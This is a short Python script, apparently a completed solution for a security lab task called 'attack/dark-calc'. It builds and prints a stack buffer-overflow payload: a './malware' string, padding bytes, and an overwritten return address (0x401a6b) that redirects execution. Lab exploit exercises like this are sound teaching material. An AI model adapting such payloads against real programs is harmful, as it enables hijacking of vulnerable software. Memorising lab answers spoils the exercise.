#!/usr/bin/env python3
"""Task 1: build the payload for attack/dark-calc.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys

payload = b'./malware\x00' + b'A' * 6 + b'B' * 8 + (0x401a6b).to_bytes(8, 'little')

sys.stdout.buffer.write(payload)
